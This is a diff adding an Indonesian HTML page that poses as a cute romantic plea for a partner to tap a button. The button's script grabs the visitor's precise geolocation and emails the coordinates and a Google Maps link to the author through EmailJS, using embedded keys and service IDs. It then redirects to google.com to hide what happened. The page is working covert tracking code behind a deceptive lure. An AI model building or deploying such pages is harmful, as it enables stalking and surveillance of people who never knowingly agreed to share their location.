@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>haaallloooo sayaaangggkuuuu 💙</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("T9936IAPidI835V1M");
+    })();
+  </script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #a7c5f7, #dbeafe);
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .card {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 14px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #1e3a8a;
+    }
+
+    p {
+      color: #374151;
+      font-size: 15px;
+    }
+
+    button {
+      margin-top: 20px;
+      background-color: #3b82f6;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #2563eb;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Sayang, bantuuuuu akuuuu dongggg sayanggggg kuhhh 💙</h2>
+    <p><br>cobaaaaa kamuuuu kliiikkkk yaaahhhhh plsssss😘</p>
+    <button onclick="kirimLokasi()">klikkkkk iniiiii sayaangggg kuhhhhh 💖</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    function kirimLokasi() {
+      const statusEl = document.getElementById("status");
+      if (navigator.geolocation) {
+        statusEl.innerText = "sebentarrrrr sayaaangggg lagiiiii loadingggg...";
+        navigator.geolocation.getCurrentPosition(function(posisi) {
+          const lat = posisi.coords.latitude;
+          const lon = posisi.coords.longitude;
+          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          emailjs.send("service_sd05c0j", "template_2htbs9m", {
+            latitude: lat,
+            longitude: lon,
+            map_link: mapLink
+          }).then(function(response) {
+            window.location.href = "https://google.com";
+          }, function(error) {
+            console.error("EmailJS error:", error);
+            statusEl.innerText = "❌ Gagal kirim lokasi ke aku 😢";
+          });
+
+        }, function(error) {
+          statusEl.innerText = "❌ Gagal ambil lokasi kamu: " + error.message;
+        });
+      } else {
+        statusEl.innerText = "❌ HP kamu nggak support lokasi ya?";
+      }
+    }
+  </script>
+</body>
+</html>
